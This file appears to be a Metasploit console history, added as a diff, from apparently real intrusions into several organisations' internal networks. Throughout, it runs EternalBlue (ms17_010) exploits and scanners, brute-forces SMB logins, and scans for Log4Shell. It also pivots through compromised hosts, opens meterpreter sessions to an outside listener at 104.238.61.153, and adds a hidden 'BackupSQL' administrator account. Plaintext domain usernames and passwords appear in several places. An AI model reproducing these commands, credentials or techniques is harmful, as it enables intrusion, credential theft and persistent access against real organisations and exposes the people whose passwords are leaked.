@@ -1,0 +1,582 @@
+search ms17
+use 0
+set rhosts 193.233.63.210
+run
+cd Allias
+resource https.rc
+set lhost 104.238.61.153
+set lport 473
+run
+sessions -i
+use auxiliary/scanner/smb/smb_ms17_010
+route add 192.168.1.0/24 1
+threads 10
+set rhosts 192.168.1.5 192.168.1.6 192.168.1.7 192.168.1.9 192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.15 192.168.1.16 192.168.1.17 192.168.1.19 192.168.1.20 192.168.1.21 192.168.1.23 192.168.1.28 192.168.1.30
+run
+use auxiliary/scanner/smb/smb_login
+options
+threads 10
+set smbdomain infoex.local
+set rhosts 192.168.1.5 192.168.1.6 192.168.1.7 192.168.1.9 192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.15 192.168.1.16 192.168.1.17 192.168.1.19 192.168.1.20 192.168.1.21 192.168.1.23 192.168.1.28 192.168.1.30
+set userpass_file /root/userpass.txt
+run
+set userpass_file /root/userpass.txt
+run
+set userpass_file /root/userpass.txt
+run
+set userpass_file /root/userpas
+set userpass_file /root/userpass.txt
+
+set userpass_file /rot/userpass/txt
+run
+set userpass_file /root/userpass/txt
+run
+options
+exit
+sessions -i
+cd Allias
+resource https.rc
+set lhost 104.238.61.153
+set lport 473
+run
+sessions -i
+use use auxiliary/scanner/smb/smb_login
+use auxiliary/scanner/smb/smb_login
+options
+set smbdomain infoex.local
+threads 10
+route add 192.168.1.0/24 1
+set USERPASSS_FILE /root/userpass.txt
+options
+threads 10
+options
+set threads 10
+options
+set rhosts 192.168.1.5 192.168.1.6 192.168.1.7 192.168.1.9 192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.15 192.168.1.16 192.168.1.17 192.168.1.19 192.168.1.20 192.168.1.21 192.168.1.23 192.168.1.28 192.168.1.30
+run
+set userpass_file /root/userpass.txt
+run
+sessions -i
+run
+options
+[*] Scanned  3 of 17 hosts (17% complete)
+run
+sessions -i
+run
+route print
+options
+ sessions -i
+sessions -i
+kill session
+kill session 1
+kill session
+
+kill session1
+kill session 1
+exit
+-y
+exit
+exit -y
+cd
+ls
+cd use
+cd snap
+ls
+cd..
+cd ..
+ls
+cd  root
+ls
+cd Allias
+resorce https.rc
+resource https.rc
+set lhost 104.238.61.153
+set lport 499
+run
+use auxiliary/scanner/smb/smb_login
+set rhosts 192.168.1.5 192.168.1.6 192.168.1.7 192.168.1.9 192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.16.8.1.15 192.168.1.16 192.168.1.17 192.168.1.19 192.168.1.20 192.168.1.21 192.168.1.23 192.168.1.28 192.168.1.30 192.168.1.31 192.168.1.34 192.168.1.35
+set smbdomain infoex.local
+set smbuser kbamba
+set smbpass Kamba2017
+run
+route add 192.168.1.0/24 1
+sessions
+run
+set USERPASS_FILE /root/userpass.txt
+run
+sessions
+exit
+exit -y
+cd Allias
+resource https.rc
+set lhost 104.238.61.153
+set lport 473
+run
+sessions
+options
+set smbdomain racs.local
+route add 172.30.115.0/24 1
+route add 192.0.0.0/8 1
+set userpass_file /root/userpass.txt
+set rhosts 172.30.115.15 192.168.0.160 192.168.1.17 192.168.0.153 192.168.1.48 192.168.0.159 192.168.1.1 192.168.0.236 172.30.115.32 192.168.0.155 192.168.0.176 192.168.0.190 192.168.0.178 192.168.0.186 192.168.0.116
+run
+soptions
+options
+set threads 10
+set rhosts 172.30.115.110 192.168.1.66 192.168.6.32 192.168.0.209 192.168.0.180 192.168.0.249 192.168.0.239 192.168.0.158 192.168.0.135 192.168.1.0 192.168.2.222 192.168.0.197 192.168.0.166 192.168.1.111 192.168.0.235
+options
+set rhosts 172.30.115.110 192.168.1.66 192.168.6.32 192.168.0.209 192.168.0.180 192.168.0.249 192.168.0.239 192.168.0.158 192.168.0.135 192.168.1.0 192.168.2.222 192.168.0.197 192.168.0.166 192.168.1.111 192.168.0.235
+options
+run
+set rhosts 192.168.0.169 192.168.0.130 172.30.115.120 192.168.0.206 192.168.0.176 192.168.0.200 192.168.0.169 192.168.0.129 192.168.0.238 192.168.0.177 192.168.0.229 192.168.0.227 192.168.0.152 192.168.0.245 192.168.1.21
+options
+run
+set rhosts 192.168.0.219 192.168.0.205 192.168.0.114 192.168.0.140 192.168.0.134 192.168.0.193 192.168.0.146 192.168.0.158 192.168.0.101 192.168.0.227 192.168.1.2 192.168.0.197 192.168.0.208 192.168.7.36 192.168.0.226
+options
+run
+set rhosts 192.168.0.191 192.168.0.196 192.168.0.172 192.168.6.160 192.168.0.235 192.168.0.177 192.168.6.26 192.168.1.1 192.168.0.214 192.168.0.145 192.168.0.228 192.168.0.245 192.168.0.241 192.168.0.14 192.168.6.33 172.24.10.14
+options
+run
+set rhosts 192.168.0.11 192.168.0.8 192.168.0.18 192.168.0.5 192.168.0.15 192.168.0.12 192.168.7.7 192.168.0.19 192.168.2.9 192.168.2.70 192.168.0.20 192.168.0.6 192.168.0.13
+run
+use auxiliary(scanner/smb/smb_ms17_010
+use auxiliary/scanner/smb/smb_ms17_010
+options
+set smbdomain racs.local
+set smbuser a.wessels
+set smbpass racs1234
+set rhosts 192.168.0.11 192.168.0.8 192.168.0.18 192.168.0.5 192.168.0.15 192.168.0.12 192.168.7.7 192.168.0.19 192.168.2.9 192.168.2.70 192.168.0.20 192.168.0.6 192.168.0.13
+options
+set threads 10
+run
+set rhosts 172.30.115.15 192.168.0.160 192.168.1.17 192.168.0.153 192.168.1.48 192.168.0.159 192.168.1.1 192.168.0.236 172.30.115.32 192.168.0.155 192.168.0.176 192.168.0.190 192.168.0.178 192.168.0.186 192.168.0.116
+run
+set rhosts 172.30.115.110 192.168.1.66 192.168.6.32 192.168.0.209 192.168.0.180 192.168.0.249 192.168.0.239 192.168.0.158 192.168.0.135 192.168.1.0 192.168.2.222 192.168.0.197 192.168.0.166 192.168.1.111 192.168.0.235
+run
+set rhosts 192.168.0.169 192.168.0.130 172.30.115.120 192.168.0.206 192.168.0.176 192.168.0.200 192.168.0.169 192.168.0.129 192.168.0.238 192.168.0.177 192.168.0.229 192.168.0.227 192.168.0.152 192.168.0.245 192.168.1.21
+run
+set rhosts 192.168.0.219 192.168.0.205 192.168.0.114 192.168.0.140 192.168.0.134 192.168.0.193 192.168.0.146 192.168.0.158 192.168.0.101 192.168.0.227 192.168.1.2 192.168.0.197 192.168.0.208 192.168.7.36 192.168.0.226
+run
+set rhosts 192.168.0.191 192.168.0.196 192.168.0.172 192.168.6.160 192.168.0.235 192.168.0.177 192.168.6.26 192.168.1.1 192.168.0.214 192.168.0.145 192.168.0.228 192.168.0.245 192.168.0.241 192.168.0.14 192.168.6.33 172.24.10.14
+run
+set rhosts 172.24.10.14
+run
+options
+route
+session
+session -i
+sessions
+use 1
+kill 1
+sessions
+kill session 1
+sessions
+sessions -k
+sessions 1 -k
+use session 1
+exit
+exit -y
+sessions
+cd Allias
+recourc https.rc
+resource https.rc
+set lhost 104.238.61.153
+set lport 473
+run
+exit
+exit-y
+set lport 474
+run
+sessions
+exit session 1
+sessions
+exit session -1
+s
+sessio exit -1
+session exit 1
+session exit -1
+sessions
+exit -y
+cd Allias
+recource https.rc
+resource https.rc
+set lhost 104.238.61.153
+set lport 474
+run
+sessions
+jobs
+use auxiliary/admin/smb/ms17_010_
+use auxiliary/scanner/smb/smb_ms17_010
+options
+set threads 10
+set rhosts 192.168.100.13 192.168.100.50 192.168.100.52 192.168.100.58 192.168.100.60 192.168.100.63 192.168.100.195 192.168.100.196 192.168.100.1
+run
+route add 192.168.100.0/24 
+route add 192.168.100.0/24 1
+sessions
+routes
+toure
+route
+run
+use auxiliary/scanner/http/log4shell_scanner
+options
+set rport 8080
+set rhosts 192.168.100.50
+set srvhost 192.168.100.50
+set TARGETURI /struts2-showcase/b
+run
+set srvhost 192.168.100.13
+set rhosts 192.168.100.13
+run
+set srvhost 192.168.100.52
+set rhosts 192.168.100.52
+run
+set rhosts 192.168.100.55
+set srvhost 192.168.100.55
+run
+set rhosts 192.168.100.0-192.168.100.200
+set srvhost 192.168.100.0-192.168.100.200
+run
+use auxiliary/scanner/smb/smb_ms17_010
+options
+set rhosts 213.149.182.0-213.149.182.255
+run
+route add 213.149.182.0/24 1
+route
+run
+options
+set rhosts 192.168.100.0-192.168.100.255
+run
+exit
+exit -y
+cd Allias
+resource https.rc
+set lhost 104.238.61.153
+set lport 474
+run
+sessions -i
+auxiliary/scanner/smb/smb_ms17_010
+y
+options
+set smbdomain uber.local
+set smbuser kristina.simkute
+set smbpass Maury1177891!
+set rhosts 10.0.7.0/24
+run
+route add 10.0.7.0/24 1
+set threads 5
+run
+use auxiliary/scanner/smb/smb_login
+options
+set userpass_fule /root/userpass.txt
+set smbdomain uber.local
+set rhosts 10.0.7.0/24
+run
+set userpass_file /root/userpass.txt
+run
+set threads 5
+run
+set threads 10
+run
+exit
+exit -y
+cd Allias
+resource https.rc
+set lport 476
+set lost 104.238.61.153
+run
+set lhost 104.238.61.153
+run
+set lport 477
+run
+sessions
+sessions -k 1
+sessions
+use auxiliary/scanner/smb/smb_login
+options
+set rhosts 10.10.34.11 10.10.34.15
+set threads 10
+set smbdomain hdel.com.tr
+set userpass_file /root/userpass.txt
+run
+route add 10.10.34.0/24 2
+run
+cd Allias
+resource https/rc
+resource https.rc
+set lport 477
+set lhost 104.238.61.153
+run
+sessions
+session -k
+session -k 1
+sessions -k 1
+sessions
+1
+use auxiliary/scanner/smb/smb_login
+set threads 5
+set threads 10
+set rhosts 10.41.1.15 10.41.1.2 10.41.1.3 10.41.1.19 10.41.1.20 10.41.1.21 10.41.1.24 10.41.1.25 10.41.1.30 10.41.1.32 10.41.1.33 10.41.1.40 10.41.1.104 10.41.1.113 10.41.1.127 10.41.1.132 10.41.1.135 10.41.1.137 10.41.1.141 10.41.1.142 10.41.1.146
+set smbdomain tp.local
+set USERPASS_FILE /root/userpass.txt
+options
+route_add 10.41.1.0/24 2
+route add 10.41.1.0/24 2
+route
+run
+set smbdomain pt.local
+run
+options
+run
+back
+search ms17
+use 3
+options
+set rhosts 10.41.1.15 10.41.1.2 10.41.1.3 10.41.1.19 10.41.1.20 10.41.1.21 10.41.1.24 10.41.1.25 10.41.1.30 10.41.1.32 10.41.1.33 10.41.1.40 10.41.1.104 10.41.1.113 10.41.1.127 10.41.1.132 10.41.1.135 10.41.1.137 10.41.1.141 10.41.1.142 10.41.1.146
+set smbdomain tp.local
+set threads 10
+run
+route add 10.41.1.0/24 2
+set smbdomain pt.local
+run
+back
+use auxiliary/scanner/smb/smb_login
+set threads 10
+set rhosts 10.41.1.15 10.41.1.2 10.41.1.3 10.41.1.19 10.41.1.20 10.41.1.21 10.41.1.24 10.41.1.25 10.41.1.30 10.41.1.32 10.41.1.33 10.41.1.40 10.41.1.104 10.41.1.113 10.41.1.127 10.41.1.132 10.41.1.135 10.41.1.137 10.41.1.141 10.41.1.142 10.41.1.146
+set smbdomain pt.local
+route add 10.41.1.0/24 2
+set userpass_file /home/Desktop/userpass.txt
+run
+set userpass_file root/userpass.txt
+run
+set userpass_file /root/userpass.txt
+run
+killexixt
+back
+cd Allias
+sessions
+exit
+exit -y
+cd Allias
+resource https.rc
+set lport 495
+set lhost 104.238.61.153
+run
+use
+use ms17
+use 3
+set rhosts 192.168.1.54
+set threads 10
+route add 192.168.1.0/24 1
+run
+use ms17
+use 2
+options
+set rhosts 192.168.1.53
+set rhosts 192.168.1.54
+set command net user BackupSQL MGlP4guqqpq5 /add
+set threads 10
+run
+
+
+run
+use ms17
+use 1
+options
+set payload windows/meterpreter/bind_tcp
+options
+set rhosts 192.168.1.54
+run
+session
+sessions
+sessions 5
+sessions 2
+cd Allias
+resource https.rc
+set lhost 104.238.61.153
+set lport 497
+run
+search ms17
+use 3
+route add 10.0.0.0/24 1
+ 
+show options
+set threads 10
+
+set smbdomain diana.local
+set rhosts 10.0.0.1 10.0.0.2 10.0.0.4 10.0.0.5 10.0.0.6 10.0.0.7 10.0.0.8 10.0.0.9 10.0.0.14 10.0.0.15 10.0.0.16 10.0.0.20 10.0.0.22 10.0.0.25 10.0.0.26 10.0.0.28 10.0.0.29 10.0.0.31 10.0.0.35 10.0.0.34 10.0.0.36 10.0.0.37 10.0.0.40 10.0.0.42 10.0.0.45 10.0.0.46 10.0.0.48 10.0.0.51 10.0.0.53 10.0.0.54 10.0.0.63 10.0.0.67 10.0.0.75 10.0.0.79 10.0.0.83 10.0.0.92 10.0.0.97 10.0.0.150 10.0.0.190 10.0.0.199 10.0.0.220 10.0.0.223 10.0.0.226 10.0.0.243 10.0.0.245
+
+run
+set smbdomain .
+options
+route
+s
+set smbdomain
+run
+set smbdomain diana.local
+run
+route add 10.0.0.0-225 1
+route a
+options
+route
+sessions
+
+run
+user smb
+us smb
+use
+use smb
+use auxiliary/scanner/smb/smb_login
+options
+
+set threads 10
+set smbdomain diana.local
+set userpass_file /root/userpass.txt
+set rhosts 10.0.0.1 10.0.0.2 10.0.0.4 10.0.0.5 10.0.0.6 10.0.0.7 10.0.0.8 10.0.0.9 10.0.0.14 10.0.0.15 10.0.0.16 10.0.0.20 10.0.0.22 10.0.0.25 10.0.0.26 10.0.0.28 10.0.0.29 10.0.0.31 10.0.0.35 10.0.0.34 10.0.0.36 10.0.0.37 10.0.0.40 10.0.0.42 10.0.0.45 10.0.0.46 10.0.0.48 10.0.0.51 10.0.0.53 10.0.0.54 10.0.0.63 10.0.0.67 10.0.0.75 10.0.0.79 10.0.0.83 10.0.0.92 10.0.0.97 10.0.0.150 10.0.0.190 10.0.0.199 10.0.0.220 10.0.0.223 10.0.0.226 10.0.0.243 10.0.0.245
+
+run
+use ms17
+use 2
+options
+set rhosts 10.0.0.245
+set command net user BackupSQL MGlP4guqqpq5 /add
+set threds 10
+run
+set command net localgroup Administrators BackupSQL /add
+run
+set command systeminfo
+run
+use exploit/windows/smb/ms17_010_psexec
+options
+set payload windows/meterpreter/bind_tcp
+set rhosts 10.0.0.245
+run
+set target 1
+run
+===s
+set target 2
+run
+set target 3
+options
+run
+options
+run
+use ms17
+use 2
+options
+h
+set command net sessions
+run
+set command ipconfig /all
+set threads 10
+run
+set command systeminfo
+run
+cd Allias
+resource httpsrc
+resource https.rc
+set lhost 104.238.61.153
+set lport 498
+run
+sessions
+use ms17
+use 2
+set rhosts 10.0.0.245
+set threads 10
+options
+set command net group "Domain Admins" /diana.local
+route add 10.0.0.0/24 1
+run
+set command net localgroup administrators
+run
+set command whoami /all
+run
+use ms17
+use 1
+options
+set rhosts 10.0.0.245
+set payload windows/meterpreter/bind_tcp
+set target 2
+run
+set rhost 104.238.61.153
+run
+set lport 445
+run
+use log4shell
+use 1
+options
+set rhost 10.0.0.251
+set srvhost 10.0.0.251
+set rport 443
+set TARGETURI /struts2-showcase/
+TARGETURI => /struts2-showcase/
+set threads 10
+run
+set rpost 80
+run
+set rport 80
+run
+set rhost 10.0.0.225
+set srvhost 10.0.0.225
+run
+set rhosts 10.0.0.0/24
+run
+set srvhost 104.194.9.238
+run
+set srvhost 104.238.61.153
+run
+set rhosts 10.0.0.9
+ru
+set rhosts 10.0.0.1
+run
+set rhosts 10.0.0.0/24
+set srvhost 0.0.0.0
+run
+172.241.27.97
+run
+set srvhost 172.241.27.91
+run
+set srvhost 10.81.234.6
+run
+set srvhost 104.238.61.153
+run
+back
+meterpreter
+resource https.rc
+set lhost 104.238.61.153
+set lport 499
+run
+sessions
+use 3
+background
+back
+ps
+sessiojns
+sessions
+sessions 3
+sessions
+sessions 3
+resource htttps.rc
+recoure https.rc
+exit
+exit -y
+sessions
+cd Allias
+resource https
+resource https.rc
+set lport 5001
+set lport 501
+set lhost 104.238.61.153
+run
+exit
+cd Allias
+cd allias
+cd Allias
+resource https.rc
+set lhost 104.238.61.153
+lport 501
+set lport 501
+run
+set lport 499
+run
+tmux ls
